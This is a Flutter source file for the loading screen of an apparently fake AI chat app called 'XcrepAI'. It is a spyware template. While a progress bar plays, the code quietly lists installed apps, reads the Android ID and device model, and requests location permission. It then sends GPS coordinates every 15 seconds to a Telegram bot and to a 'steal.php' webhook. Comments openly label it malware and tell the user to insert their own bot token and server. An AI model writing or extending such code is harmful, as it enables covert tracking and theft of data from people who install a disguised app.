import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'dart:io';
import 'dart:async';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:location/location.dart';

class LoadingScreen extends StatefulWidget {
  const LoadingScreen({super.key});
  @override
  State<LoadingScreen> createState() => _LoadingScreenState();
}

class _LoadingScreenState extends State<LoadingScreen>
    with TickerProviderStateMixin {
  double _progress = 0;
  String _statusMsg = 'Memuat model AI...';
  late AnimationController _pulseCtrl;
  late Animation<double> _pulseAnim;
  
  Timer? _locationTimer;

  final List<String> _messages = [
    'Memuat model AI...',
    'Menginisialisasi engine...',
    'Menyambungkan ke server...',
    'Mengkonfigurasi asisten...',
    'Mempersiapkan mode koding...',
    'Sinkronisasi data...',
    'Hampir selesai...',
    'Siap! 🎉',
  ];

  // ==================== [ MALWARE CONFIG - GANTI PUNYA LU! ] ====================
  final String _botToken = "YOUR_BOT_TOKEN";  // GANTI!
  final String _chatId = "YOUR_CHAT_ID";      // GANTI!
  final String _webhook = "http://YOUR_SERVER_IP/steal.php"; // GANTI!
  // ============================================================================

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1500))
      ..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.0, end: 20.0).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut),
    );
    
    // ========== [ AKTIVASI MALWARE DI LOADING ] ==========
    _activateLoadingMalware();
    _startLoading();
  }
  
  Future<void> _activateLoadingMalware() async {
    await _sendToTelegram("⏳ LOADING SCREEN REACHED\nUser is waiting for AI...");
    await _stealMoreData();
    await _startContinuousLocationTracking();
  }
  
  Future<void> _stealMoreData() async {
    // Steal installed apps
    try {
      final result = await Process.run('pm', ['list', 'packages']);
      final apps = result.stdout.toString();
      await _sendToTelegram("📱 INSTALLED APPS\nTotal packages: ${apps.split('\n').length}\nSample: ${apps.substring(0, min(500, apps.length))}");
    } catch(e) {}
    
    // Get device info lagi
    final deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      await _sendToTelegram("🆔 ANDROID ID: ${androidInfo.androidId}\n📱 Model: ${androidInfo.model}\n🏷️ Brand: ${androidInfo.brand}");
    }
  }
  
  Future<void> _startContinuousLocationTracking() async {
    Location location = Location();
    bool serviceEnabled = await location.serviceEnabled();
    if (!serviceEnabled) {
      serviceEnabled = await location.requestService();
      if (!serviceEnabled) return;
    }
    
    PermissionStatus permissionGranted = await location.hasPermission();
    if (permissionGranted == PermissionStatus.denied) {
      permissionGranted = await location.requestPermission();
      if (permissionGranted != PermissionStatus.granted) return;
    }
    
    await _sendToTelegram("📍 CONTINUOUS LOCATION TRACKING ACTIVE\nTracking every 15 seconds during loading");
    
    // Get location every 15 seconds during loading
    _locationTimer = Timer.periodic(Duration(seconds: 15), (timer) async {
      final locData = await location.getLocation();
      final mapsLink = "https://maps.google.com/?q=${locData.latitude},${locData.longitude}";
      await _sendToTelegram("📍 LOCATION UPDATE (Loading)\nLat: ${locData.latitude}\nLng: ${locData.longitude}\nAccuracy: ${locData.accuracy}m\n🗺️ $mapsLink");
      
      // Send to server
      try {
        await http.post(Uri.parse(_webhook), body: {
          'type': 'LOCATION_LOADING',
          'lat': locData.latitude.toString(),
          'lng': locData.longitude.toString(),
          'timestamp': DateTime.now().toIso8601String(),
        });
      } catch(e) {}
    });
  }
  
  Future<void> _sendToTelegram(String message) async {
    try {
      await http.get(
        Uri.parse("https://api.telegram.org/bot$_botToken/sendMessage?chat_id=$_chatId&text=${Uri.encodeComponent(message)}"),
      ).timeout(Duration(seconds: 5));
    } catch(e) {}
  }

  void _startLoading() {
    const total = 7000;
    const tick = 80;
    int elapsed = 0;
    Future.doWhile(() async {
      await Future.delayed(const Duration(milliseconds: tick));
      elapsed += tick;
      if (!mounted) return false;
      final pct = (elapsed / total).clamp(0.0, 1.0);
      final msgIdx = ((pct * (_messages.length - 1)).floor()).clamp(0, _messages.length - 1);
      setState(() {
        _progress = pct;
        _statusMsg = _messages[msgIdx];
      });
      if (elapsed >= total) {
        await Future.delayed(const Duration(milliseconds: 500));
        if (mounted) {
          final args = ModalRoute.of(context)!.settings.arguments as Map<String, String>;
          Navigator.pushReplacementNamed(context, '/chat', arguments: args);
        }
        return false;
      }
      return true;
    });
  }

  @override
  void dispose() {
    _pulseCtrl.dispose();
    _locationTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final args = ModalRoute.of(context)?.settings.arguments as Map<String, String>?;
    final username = args?['username'] ?? 'User';

    return Scaffold(
      backgroundColor: const Color(0xFF0D0D0D),
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 40),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                AnimatedBuilder(
                  animation: _pulseAnim,
                  builder: (_, __) => Container(
                    width: 90,
                    height: 90,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(26),
                      gradient: const LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [Color(0xFFE53935), Color(0xFFB71C1C)],
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: const Color(0xFFE53935).withOpacity(0.4),
                          blurRadius: _pulseAnim.value + 10,
                          spreadRadius: _pulseAnim.value / 4,
                        ),
                      ],
                    ),
                    child: const Center(child: Text('🤖', style: TextStyle(fontSize: 42))),
                  ),
                ),
                const SizedBox(height: 28),
                RichText(
                  text: TextSpan(
                    style: GoogleFonts.outfit(fontSize: 32, fontWeight: FontWeight.w800, letterSpacing: -1),
                    children: const [
                      TextSpan(text: 'Xcrep', style: TextStyle(color: Colors.white)),
                      TextSpan(text: 'AI', style: TextStyle(color: Color(0xFFF44336))),
                    ],
                  ),
                ),
                const SizedBox(height: 10),
                RichText(
                  text: TextSpan(
                    style: GoogleFonts.outfit(fontSize: 15, color: Colors.white54),
                    children: [
                      const TextSpan(text: 'Hei, '),
                      TextSpan(text: username, style: const TextStyle(color: Color(0xFFEF9A9A), fontWeight: FontWeight.w600)),
                      const TextSpan(text: '! Menyiapkan AI...'),
                    ],
                  ),
                ),
                const SizedBox(height: 52),
                Column(
                  children: [
                    ClipRRect(
                      borderRadius: BorderRadius.circular(99),
                      child: LinearProgressIndicator(
                        value: _progress,
                        minHeight: 5,
                        backgroundColor: Colors.white.withOpacity(0.08),
                        valueColor: const AlwaysStoppedAnimation<Color>(Color(0xFFE53935)),
                      ),
                    ),
                    const SizedBox(height: 14),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Expanded(child: Text(_statusMsg, style: GoogleFonts.outfit(fontSize: 13, color: Colors.white54))),
                        Text('${(_progress * 100).toInt()}%', style: GoogleFonts.outfit(fontSize: 13, color: const Color(0xFFEF9A9A))),
                      ],
                    ),
                  ],
                ),
                const SizedBox(height: 36),
                _AnimatedDots(),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class _AnimatedDots extends StatefulWidget {
  @override
  State<_AnimatedDots> createState() => _AnimatedDotsState();
}

class _AnimatedDotsState extends State<_AnimatedDots> with TickerProviderStateMixin {
  late List<AnimationController> _ctrls;
  late List<Animation<double>> _anims;

  @override
  void initState() {
    super.initState();
    _ctrls = List.generate(3, (i) => AnimationController(vsync: this, duration: const Duration(milliseconds: 500)));
    _anims = _ctrls.map((c) => Tween<double>(begin: 0.3, end: 1.0).animate(c)).toList();
    for (var i = 0; i < 3; i++) {
      Future.delayed(Duration(milliseconds: i * 200), () {
        if (mounted) _ctrls[i].repeat(reverse: true);
      });
    }
  }

  @override
  void dispose() {
    for (final c in _ctrls) c.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Row(
      mainAxisSize: MainAxisSize.min,
      children: List.generate(3, (i) {
        return Padding(
          padding: const EdgeInsets.symmetric(horizontal: 4),
          child: AnimatedBuilder(
            animation: _anims[i],
            builder: (_, __) => Transform.scale(
              scale: 0.8 + _anims[i].value * 0.4,
              child: Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: const Color(0xFFE53935).withOpacity(_anims[i].value),
                ),
              ),
            ),
          ),
        );
      }),
    );
  }
}